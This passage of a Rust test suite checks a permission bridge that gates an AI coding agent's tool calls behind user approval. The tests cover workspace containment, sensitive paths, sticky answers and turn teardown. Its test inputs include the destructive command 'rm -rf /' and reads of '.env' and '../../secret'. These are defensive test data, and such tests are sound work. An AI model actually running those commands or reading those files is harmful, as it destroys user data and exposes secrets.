        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn a_double_dot_inside_a_name_is_not_a_traversal() {
        let roots = vec![PathBuf::from("/work")];
        assert_eq!(
            outside_workspace(&json!({ "Query": "foo..bar" }), &roots),
            None,
            "`..` must be a path component to count, not two characters"
        );
        assert_eq!(
            outside_workspace(&json!({ "AbsolutePath": "../secret" }), &roots).as_deref(),
            Some("../secret")
        );
    }

    #[tokio::test]
    async fn an_ordinary_string_argument_is_not_mistaken_for_a_path() {
        let workspace = std::env::temp_dir().join("agy-acp-query-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) =
            test_bridge(&workspace.display().to_string(), &["grep_search"]).await;

        let (decision, reason) = bridge
            .decide(&json!({
                "conversationId": "conv-1",
                "toolCall": { "name": "grep_search", "args": { "Query": "foo bar" } },
            }))
            .await;

        assert_eq!(decision, Decision::Allow, "a plain query must auto-allow");
        assert!(reason.contains("Auto-allowed"), "{reason}");
        assert!(rx.try_recv().is_err(), "the user must not be prompted");
    }

    #[tokio::test]
    async fn always_allow_does_not_bypass_the_sensitive_path_check() {
        let workspace = std::env::temp_dir().join("agy-acp-always-sensitive-test");
        std::fs::create_dir_all(&workspace).unwrap();
        // Nothing auto-allowed, so the first call reaches the user and the sticky
        // answer is actually recorded. Both calls use the same tool: the sticky
        // key is (session, tool), so a second call to a different tool would
        // never consult the remembered answer and would prove nothing.
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;
        let ordinary = workspace.join("notes.md").display().to_string();

        let first = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "view_file", "args": { "AbsolutePath": ordinary } },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } })),
            )
            .await;
        assert_eq!(first.await.unwrap().0, Decision::Allow);

        // Same tool, sensitive path: the remembered allow must not cover it.
        let second = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "view_file", "args": { "AbsolutePath": ".env" } },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
            )
            .await;
        assert_eq!(second.await.unwrap().0, Decision::Deny);
    }

    #[tokio::test]
    async fn always_allow_does_not_bypass_the_workspace_check() {
        let workspace = std::env::temp_dir().join("agy-acp-always-workspace-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;
        let ordinary = workspace.join("notes.md").display().to_string();

        let first = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "view_file", "args": { "AbsolutePath": ordinary } },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } })),
            )
            .await;
        assert_eq!(first.await.unwrap().0, Decision::Allow);

        // Same tool, path outside the workspace: still the user's call.
        let second = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "view_file", "args": { "AbsolutePath": "../../secret" } },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
            )
            .await;
        assert_eq!(second.await.unwrap().0, Decision::Deny);
    }

    #[tokio::test]
    async fn ending_a_turn_answers_its_pending_permission_request() {
        let workspace = std::env::temp_dir().join("agy-acp-cancel-pending-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;

        let pending = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "run_command", "args": { "CommandLine": "sleep 45" } },
                    }))
                    .await
            })
        };
        expect_permission_request(&mut rx).await;

        assert_eq!(
            bridge.abandon_pending("session-1").await,
            1,
            "the outstanding request belongs to this session"
        );

        // Bounded on purpose. Without this the call sits here for the full
        // response timeout, which reads as a hung suite rather than a red test.
        let (decision, reason) = tokio::time::timeout(std::time::Duration::from_secs(5), pending)
            .await
            .expect("the request must be answered at once, not left to time out")
            .unwrap();
        assert_eq!(decision, Decision::Deny, "agy must not run the tool");
        assert!(
            reason.contains("turn ended"),
            "the reason should say why: {reason}"
        );
        assert!(
            !bridge.refused_during_prompt().await,
            "an ended turn is not a refusal -- nobody declined anything"
        );
        assert!(
            bridge.state.lock().await.pending.is_empty(),
            "the request must not be left behind"
        );
    }

    #[tokio::test]
    async fn one_sessions_turn_ending_leaves_another_sessions_request_alone() {
        let workspace = std::env::temp_dir().join("agy-acp-cancel-other-session-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;

        let pending = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;

        // "session-10" on purpose: it has the pending session's id as a prefix,
        // so a filter doing anything looser than equality fails here.
        assert_eq!(
            bridge.abandon_pending("session-10").await,
            0,
            "another session's turn ending must not touch this one"
        );
        assert!(!pending.is_finished(), "the request is still waiting");

        // And it still answers normally afterwards.
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "allow_once" } })),
            )
            .await;
        assert_eq!(pending.await.unwrap().0, Decision::Allow);
    }

    #[tokio::test]
    async fn a_late_allow_after_the_turn_ended_does_not_become_sticky() {
        let workspace = std::env::temp_dir().join("agy-acp-cancel-late-answer-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;

        let pending = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "run_command", "args": { "CommandLine": "rm -rf /" } },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        bridge.abandon_pending("session-1").await;
        let (decision, _) = tokio::time::timeout(std::time::Duration::from_secs(5), pending)
            .await
            .expect("a cancelled request must be answered at once, not left to time out")
            .unwrap();
        assert_eq!(decision, Decision::Deny);

        // The host may still answer -- it has no way of knowing we stopped
        // waiting. An "allow" arriving now must not resurrect anything.
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } })),
            )
            .await;
        assert!(
            !bridge.state.lock().await.always.values().any(|d| *d == Decision::Allow),
            "a late allow must not become a sticky allow for the rest of the session"
        );
    }

    /// The cancel path is not the only way a turn ends. agy dying, or its output
    /// becoming unreadable, ends one too -- and leaves the same request behind.
    #[tokio::test]
    async fn a_turn_that_ends_without_being_cancelled_still_clears_its_request() {
        let workspace = std::env::temp_dir().join("agy-acp-turn-end-pending-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;

        let pending = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
                    }))
                    .await
            })
        };
        expect_permission_request(&mut rx).await;

        // What the adapter does at the end of every turn, cancelled or not.
        bridge.set_active_session(None).await;
        assert_eq!(bridge.abandon_pending("session-1").await, 1);

        let (decision, _) = tokio::time::timeout(std::time::Duration::from_secs(5), pending)
            .await
            .expect("the request must be answered at once, not left to time out")
            .unwrap();
        assert_eq!(decision, Decision::Deny);
        assert!(
            !bridge.refused_during_prompt().await,
            "a turn ending is not the user refusing"
        );
    }

    /// Belt and braces for the teardown call: even if nothing cleared the last
    /// turn's request, starting a turn must, because that is the one place every
    /// turn goes through and it is where the refusal flag is reset.
    #[tokio::test]
    async fn starting_a_turn_clears_a_request_left_over_from_the_last_one() {
        let workspace = std::env::temp_dir().join("agy-acp-turn-start-pending-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;

        let leftover = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
                    }))
                    .await
            })
        };
        expect_permission_request(&mut rx).await;

        // The turn ends without anything draining the bridge, then the next one
        // starts. Nothing else stands between the leftover and the new turn.
        bridge.set_active_session(Some("session-1")).await;

        let (decision, _) = tokio::time::timeout(std::time::Duration::from_secs(5), leftover)
            .await
            .expect("the leftover must not survive into the new turn")
            .unwrap();
        assert_eq!(decision, Decision::Deny);
        assert!(
            bridge.state.lock().await.pending.is_empty(),
            "nothing may be left to time out during the new turn"
        );
        assert!(
            !bridge.refused_during_prompt().await,
            "and it must not have marked the new turn a refusal"
        );
    }

    /// The case a session-scoped drain leaves open. `refused_during_prompt` is
    /// one flag for the whole adapter, so a request stranded by session A does
    /// not time out into session A -- it times out into whatever turn is running
    /// 540 seconds later. Starting *any* turn has to clear it.
    #[tokio::test]
    async fn starting_a_turn_clears_a_request_stranded_by_a_different_session() {
        let workspace = std::env::temp_dir().join("agy-acp-turn-start-other-session-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;

        // Belongs to session-1, via the conv-1 mapping test_bridge installs.
        let stranded = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
                    }))
                    .await
            })
        };
        expect_permission_request(&mut rx).await;

        // Session-1's turn ended without draining, and the next turn is a
        // different session's. Nothing here mentions session-1.
        bridge.set_active_session(Some("session-2")).await;

        let (decision, _) = tokio::time::timeout(std::time::Duration::from_secs(5), stranded)
            .await
            .expect("session-1's leftover must not survive into session-2's turn")
            .unwrap();
        assert_eq!(decision, Decision::Deny);
        assert!(
            bridge.state.lock().await.pending.is_empty(),
            "nothing may be left to time out during session-2's turn"
        );
        assert!(
            !bridge.refused_during_prompt().await,
            "and session-2 must not be reported as a refusal"
        );
    }

    /// A permission decision is applied by the hook task, and that task can be
    /// polled long after the turn that asked has ended -- the host answers, the
    /// oneshot resolves, and the work that acts on it runs whenever the runtime
    /// gets to it. That is a second route to the bug this branch fixes: the
    /// pending entry is already gone, so draining cannot help, and the refusal
    /// lands in a turn that never asked anybody anything.
    #[tokio::test]
    async fn a_decision_applied_after_its_turn_ended_does_not_refuse_the_next_one() {
        let workspace = std::env::temp_dir().join("agy-acp-late-decision-turn-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, _rx) = test_bridge(&workspace.display().to_string(), &[]).await;

        bridge.set_active_session(Some("session-1")).await;
        let asking_turn = bridge.state.lock().await.turn_generation;

        // Session-1's turn ends and session-2's begins. Nothing is pending by
        // now -- the host already answered, and only the applying is outstanding.
        bridge.set_active_session(Some("session-2")).await;

        let key = (
            "session-1".to_string(),
            "run_command".to_string(),
            Some("{}".to_string()),
        );
        let (decision, _) = bridge
            .apply_outcome(
                &json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } }),
                key.clone(),
                "run_command",
                AlwaysScope::Command,
                asking_turn,
            )
            .await;

        assert_eq!(decision, Decision::Deny, "agy still must not run the tool");
        assert!(
            !bridge.refused_during_prompt().await,
            "session-2 never asked anyone anything and must not report a refusal"
        );

        // And the same answer arriving during its own turn still counts.
        let current_turn = bridge.state.lock().await.turn_generation;
        bridge
            .apply_outcome(
                &json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } }),
                key,
                "run_command",
                AlwaysScope::Command,
                current_turn,
            )
            .await;
        assert!(
            bridge.refused_during_prompt().await,
            "a refusal in the turn that asked is exactly what the flag is for"
        );
    }

    /// The auto-allow policy is a decision like any other, so it must not run
    /// for a turn that is over -- it was reachable before the staleness check.
    #[tokio::test]
    async fn a_stale_request_is_not_waved_through_by_the_auto_allow_policy() {
        let workspace = std::env::temp_dir().join("agy-acp-stale-auto-allow-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, _rx) = test_bridge(&workspace.display().to_string(), &["ask_question"]).await;

        // Sanity: this tool is auto-allowed while the turn is running.
        let (live, _) = bridge
            .decide(&json!({
                "conversationId": "conv-1",
                "toolCall": { "name": "ask_question", "args": {} },
            }))
            .await;
        assert_eq!(live, Decision::Allow, "auto-allow works during a turn");

        bridge.set_active_session(None).await;

        let (decision, reason) = bridge
            .decide(&json!({
                "conversationId": "conv-1",
                "toolCall": { "name": "ask_question", "args": {} },
            }))
            .await;
        assert_eq!(
            decision,
            Decision::Deny,
            "a turn that is over gets no decisions, auto-allowed or not"
        );
        assert!(reason.contains("turn ended"), "say why: {reason}");
    }

    /// The window between deciding to ask and registering the question. The turn
    /// can end in that gap -- `escapes_containment` awaits the same mutex in
    /// between -- and teardown's drain would run before the entry exists to be
    /// drained, leaving a prompt on the user's screen for a turn that is over.
    ///
    /// Driven through `register_pending` rather than by racing two tasks: the
    /// interleaving this guards against is real but not schedulable on demand,
    /// and a test that only passes when the runtime cooperates is not a test.
    #[tokio::test]
    async fn a_question_is_not_registered_if_its_turn_ended_while_deciding() {
        let workspace = std::env::temp_dir().join("agy-acp-register-after-teardown-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, _rx) = test_bridge(&workspace.display().to_string(), &[]).await;

        let turn = bridge.state.lock().await.turn_generation;

        // What teardown does, in the gap between the check and the registration.
        bridge.set_active_session(None).await;
        assert_eq!(bridge.abandon_pending("session-1").await, 0, "nothing to drain yet");

        let (tx, _rx_answer) = oneshot::channel();
        assert!(
            !bridge
                .register_pending("agyacp-perm-late", "session-1", turn, tx)
                .await,
            "the turn ended while we were deciding, so there is nothing to ask"
        );
        assert!(
            bridge.state.lock().await.pending.is_empty(),
            "no entry may outlive the drain that already ran"
        );

        // The next turn starting is also enough, not just teardown.
        bridge.set_active_session(Some("session-1")).await;
        let stale = bridge.state.lock().await.turn_generation.wrapping_sub(1);
        let (tx, _rx_answer2) = oneshot::channel();
        assert!(
            !bridge
                .register_pending("agyacp-perm-late-2", "session-1", stale, tx)
                .await,
            "a question from the previous turn does not join this one"
        );

        // And the ordinary case still registers.
        let current = bridge.state.lock().await.turn_generation;
        let (tx, _rx_answer3) = oneshot::channel();
        assert!(
            bridge
                .register_pending("agyacp-perm-ok", "session-1", current, tx)
                .await
        );
        assert_eq!(bridge.state.lock().await.pending.len(), 1);
    }

    /// A hook task is not polled on any schedule of ours. If it first reaches
    /// `decide` after its own turn tore down, it must not raise a prompt: the
    /// turn that would have used the answer is gone, so the only thing a prompt
    /// can do is confuse the user and leave an entry to time out.
    #[tokio::test]
    async fn a_request_arriving_after_its_turn_ended_is_not_asked_about() {
        let workspace = std::env::temp_dir().join("agy-acp-request-after-teardown-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;

        // The turn tears down before the hook task gets to run.
        bridge.set_active_session(None).await;

        let (decision, reason) = tokio::time::timeout(
            std::time::Duration::from_secs(5),
            bridge.decide(&json!({
                "conversationId": "conv-1",
                "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
            })),
        )
        .await
        .expect("it must answer at once, not sit in pending waiting for a timeout");

        assert_eq!(decision, Decision::Deny, "agy must not run the tool");
        assert!(reason.contains("turn ended"), "say why: {reason}");
        assert!(
            rx.try_recv().is_err(),
            "the user must not be prompted for a turn that is over"
        );
        assert!(
            bridge.state.lock().await.pending.is_empty(),
            "and nothing may be left behind to time out"
        );
    }

    /// The same lateness, but the next turn has already started. Reading the
    /// current generation here would adopt the stale request into the running
    /// turn, and its answer would count against a turn that never asked.
    #[tokio::test]
    async fn a_request_from_a_previous_turn_does_not_join_the_running_one() {
        let workspace = std::env::temp_dir().join("agy-acp-request-wrong-turn-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;

        // conv-1 belongs to session-1; session-2's turn is the one running.
        bridge.set_active_session(Some("session-2")).await;

        let (decision, _) = tokio::time::timeout(
            std::time::Duration::from_secs(5),
            bridge.decide(&json!({
                "conversationId": "conv-1",
                "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
            })),
        )
        .await
        .expect("it must answer at once");

        assert_eq!(decision, Decision::Deny);
        assert!(
            rx.try_recv().is_err(),
            "session-2's user must not be asked about session-1's tool call"
        );
        assert!(
            !bridge.refused_during_prompt().await,
            "and session-2 must not be reported as a refusal"
        );
    }

    /// The gap between one turn's teardown and the next turn's start. No turn is
    /// running here, so there is no later turn to mislead -- but `always` is not
    /// reset by anything, so a sticky answer applied in the gap outlives it and
    /// silently pre-approves the turns that follow.
    #[tokio::test]
    async fn an_answer_applied_between_turns_does_not_stick_either() {
        let workspace = std::env::temp_dir().join("agy-acp-between-turns-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, _rx) = test_bridge(&workspace.display().to_string(), &[]).await;

        bridge.set_active_session(Some("session-1")).await;
        let asking_turn = bridge.state.lock().await.turn_generation;

        // The host answered just before teardown, so the request is already gone
        // and `abandon_pending` has nothing to find. Only the applying is left.
        bridge.set_active_session(None).await;

        let key = (
            "session-1".to_string(),
            "run_command".to_string(),
            Some("{}".to_string()),
        );
        bridge
            .apply_outcome(
                &json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } }),
                key.clone(),
                "run_command",
                AlwaysScope::Command,
                asking_turn,
            )
            .await;
        assert!(
            bridge.state.lock().await.always.is_empty(),
            "an always applied after teardown must not pre-approve the next turn"
        );

        // The refusing direction of the same gap.
        bridge
            .apply_outcome(
                &json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } }),
                key,
                "run_command",
                AlwaysScope::Command,
                asking_turn,
            )
            .await;
        assert!(
            !bridge.refused_during_prompt().await,
            "the turn that asked already read the flag and ended"
        );
    }

    /// The sticky half of the same window: an "always" clicked on a prompt whose
    /// turn has ended must not configure the turns that follow it.
    #[tokio::test]
    async fn an_always_applied_after_its_turn_ended_does_not_stick() {
        let workspace = std::env::temp_dir().join("agy-acp-late-always-turn-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, _rx) = test_bridge(&workspace.display().to_string(), &[]).await;

        bridge.set_active_session(Some("session-1")).await;
        let asking_turn = bridge.state.lock().await.turn_generation;
        bridge.set_active_session(Some("session-2")).await;

        let key = (
            "session-1".to_string(),
            "run_command".to_string(),
            Some("{}".to_string()),
        );
        let (decision, _) = bridge
            .apply_outcome(
                &json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } }),
                key.clone(),
                "run_command",
                AlwaysScope::Command,
                asking_turn,
            )
            .await;

        // The caller still hears the answer -- it asked, and this is the reply.
        assert_eq!(decision, Decision::Allow);
        assert!(
            bridge.state.lock().await.always.is_empty(),
            "a stale always must not survive as a standing permission"
        );
    }

    #[tokio::test]
    async fn always_reject_still_applies_immediately() {
        let workspace = std::env::temp_dir().join("agy-acp-always-reject-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), READ_TOOLS).await;

        // First call must prompt, so use a non-auto-allowed tool.
        let first = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_always" } })),
            )
            .await;
        assert_eq!(first.await.unwrap().0, Decision::Deny);

        // Second call: the same command, so the remembered reject applies with no
        // new prompt.
        let (decision, _) = bridge
            .decide(&json!({
                "conversationId": "conv-1",
                "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
            }))
            .await;
        assert_eq!(decision, Decision::Deny);
        assert!(
            rx.try_recv().is_err(),
            "the remembered reject must not prompt again for the same command"
        );

        // A different command is asked about. Keying cuts both ways: the user
        // rejected `ls`, not every command for the rest of the session. This is a
        // real reduction in what one reject covers, and is documented as such.
        let asking = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "run_command", "args": { "CommandLine": "pwd" } },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
            )
            .await;
        assert_eq!(asking.await.unwrap().0, Decision::Deny);
    }

    /// Records a remembered "Always allow" for `run_command` and returns the bridge.
    async fn bridge_with_run_command_always_allowed(
        workspace: &str,
    ) -> (PermissionBridge, mpsc::UnboundedReceiver<Option<String>>) {
        let (bridge, mut rx) = test_bridge(workspace, &[]).await;
        let first = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } })),
            )
            .await;
        assert_eq!(first.await.unwrap().0, Decision::Allow);
        (bridge, rx)
    }

    #[tokio::test]
    async fn the_always_options_name_the_command_for_command_tools() {
        let workspace = std::env::temp_dir().join("agy-acp-option-label-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;

        let asking = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "run_command", "args": { "CommandLine": "ls" } },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        let options = request["params"]["options"].as_array().unwrap().clone();

        let named = |kind: &str| -> String {
            options.iter().find(|o| o["kind"] == kind).unwrap()["name"]
                .as_str()
                .unwrap()
                .to_string()
        };
        // The answer covers this command, so the label has to say so. It does not
        // repeat the command text: the prompt's title is already ``Run `ls` ``,
        // shown directly above these buttons.
        assert_eq!(
            named("allow_always"),
            "Always allow this exact command this session"
        );
        assert_eq!(
            named("reject_always"),
            "Always reject this exact command this session"
        );
        assert_eq!(request["params"]["toolCall"]["title"], "Run `ls`");
        // The ACP kinds stay standard so hosts can still style and bind them.
        for kind in ["allow_once", "allow_always", "reject_once", "reject_always"] {
            assert!(options.iter().any(|o| o["kind"] == kind), "missing {kind}");
        }

        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
            )
            .await;
        assert_eq!(asking.await.unwrap().0, Decision::Deny);
    }

    /// A narrow key is not the same claim as "this is a command". `read_url_content`
    /// is keyed by its arguments -- a `Url` is not a path, so containment cannot
    /// constrain it -- but nothing above the buttons is a command, and the title
    /// says so. A label that called it one would be asking the user to consent to
    /// a description of the call that is simply false.
    #[tokio::test]
    async fn the_always_options_do_not_call_a_url_fetch_a_command() {
        let workspace = std::env::temp_dir().join("agy-acp-option-label-url-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;

        let asking = {
            let bridge = bridge.clone();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": {
                            "name": "read_url_content",
                            "args": { "Url": "https://example.com/readme" },
                        },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        let options = request["params"]["options"].as_array().unwrap().clone();
        let named = |kind: &str| -> String {
            options.iter().find(|o| o["kind"] == kind).unwrap()["name"]
                .as_str()
                .unwrap()
                .to_string()
        };

        assert_eq!(
            named("allow_always"),
            "Always allow this exact call this session"
        );
        assert_eq!(
            named("reject_always"),
            "Always reject this exact call this session"
        );
        // Not the tool-level wording either: the answer really is narrow, and a
        // label promising less than the key stores would be the safe lie rather
        // than the dangerous one, but it would still be a lie.
        for kind in ["allow_always", "reject_always"] {
            assert!(
                !named(kind).contains("read_url_content"),
                "{kind} must not claim tool-level scope: {}",
                named(kind)
            );
        }

        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
            )
            .await;
        assert_eq!(asking.await.unwrap().0, Decision::Deny);
    }

    /// The reason a *remembered* answer carries has to use the same noun the
    /// button used, or the explanation contradicts the consent it came from. This
    /// is a third site, reached on the second and every later call, and it drifted
    /// while the first two were being fixed.
    #[tokio::test]
    async fn a_remembered_answer_is_explained_in_the_words_it_was_given_in() {
        let workspace = std::env::temp_dir().join("agy-acp-remembered-wording-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;

        let call = json!({
            "conversationId": "conv-1",
            "toolCall": {
                "name": "read_url_content",
                "args": { "Url": "https://example.com/readme" },
            },
        });

        // First call: answer "always allow" at the prompt.
        let asking = {
            let bridge = bridge.clone();
            let call = call.clone();
            tokio::spawn(async move { bridge.decide(&call).await })
        };
        let request = expect_permission_request(&mut rx).await;
        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "allow_always" } })),
            )
            .await;
        let (decision, reason) = asking.await.unwrap();
        assert_eq!(decision, Decision::Allow);
        assert!(reason.contains("this exact call"), "at the prompt: {reason}");

        // Second call: the remembered answer applies with no prompt, and explains
        // itself the same way.
        let (decision, reason) = bridge.decide(&call).await;
        assert_eq!(decision, Decision::Allow);
        assert_eq!(reason, "Always allowed this exact call in this session.");
        assert!(
            !reason.contains("command"),
            "a URL fetch is not a command: {reason}"
        );
    }

    /// The wording is chosen by [`AlwaysScope`], and the enum is what keeps the
    /// button, the key and the reason string from drifting apart. Pin the mapping
    /// directly so a fourth case cannot be added without deciding what it says.
    #[test]
    fn the_always_scope_decides_the_wording() {
        assert_eq!(AlwaysScope::of(None, &json!({})), AlwaysScope::Tool);
        assert_eq!(
            AlwaysScope::of(Some(&"{}".to_string()), &json!({ "CommandLine": "ls" })),
            AlwaysScope::Command
        );
        assert_eq!(
            AlwaysScope::of(Some(&"{}".to_string()), &json!({ "Url": "https://x.test" })),
            AlwaysScope::Call
        );
        // Only `Tool` names the tool; the other two must supply a noun.
        assert_eq!(AlwaysScope::Tool.noun(), None);
        assert!(AlwaysScope::Command.noun().is_some());
        assert!(AlwaysScope::Call.noun().is_some());
        assert_ne!(AlwaysScope::Command.noun(), AlwaysScope::Call.noun());
    }

    /// Path tools keep the tool-level wording, because they keep the tool-level
    /// key -- containment and the sensitive-path list still constrain them.
    #[tokio::test]
    async fn the_always_options_name_the_tool_for_path_tools() {
        let workspace = std::env::temp_dir().join("agy-acp-option-label-path-test");
        std::fs::create_dir_all(&workspace).unwrap();
        let (bridge, mut rx) = test_bridge(&workspace.display().to_string(), &[]).await;

        let target = workspace.join("a.txt");
        let asking = {
            let bridge = bridge.clone();
            let target = target.display().to_string();
            tokio::spawn(async move {
                bridge
                    .decide(&json!({
                        "conversationId": "conv-1",
                        "toolCall": { "name": "view_file", "args": { "TargetFile": target } },
                    }))
                    .await
            })
        };
        let request = expect_permission_request(&mut rx).await;
        let options = request["params"]["options"].as_array().unwrap().clone();
        let named = |kind: &str| -> String {
            options.iter().find(|o| o["kind"] == kind).unwrap()["name"]
                .as_str()
                .unwrap()
                .to_string()
        };
        assert_eq!(named("allow_always"), "Always allow view_file this session");
        assert_eq!(named("reject_always"), "Always reject view_file this session");
        for kind in ["allow_once", "allow_always", "reject_once", "reject_always"] {
            assert!(options.iter().any(|o| o["kind"] == kind), "missing {kind}");
        }

        bridge
            .resolve_response(
                &request["id"],
                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
            )
            .await;
        assert_eq!(asking.await.unwrap().0, Decision::Deny);
    }

    /// Pins a known gap, tracked in TODO.md: sticky answers are keyed by tool
    /// name, so approving one command approves every later command. This test
    /// asserts today's behaviour deliberately -- when the gap is closed it will
    /// fail, which is the point: the fix must come with a doc change.
    /// The security property of the fingerprint, stated directly: two argument
    /// sets that would run different things must never share a key. Key order is
    /// not a difference (serde_json sorts, with no `preserve_order` feature), but
    /// everything that decides what runs is.
    #[test]
    fn different_arguments_never_share_a_fingerprint() {
        let fp = |v: Value| args_fingerprint(&v);

        // Key order is not a difference -- the same arguments written two ways.
        assert_eq!(
            fp(json!({ "CommandLine": "ls", "Cwd": "/a" })),
            fp(json!({ "Cwd": "/a", "CommandLine": "ls" })),
            "key order must not split one command into two keys"
        );

        // Everything that changes what runs, does.
        let base = json!({ "CommandLine": "ls", "Cwd": "/a" });
        for different in [
            json!({ "CommandLine": "rm -rf /", "Cwd": "/a" }),
            json!({ "CommandLine": "ls", "Cwd": "/b" }),
            json!({ "CommandLine": "ls" }),
            json!({ "CommandLine": "ls", "Cwd": "/a", "Extra": "added later" }),
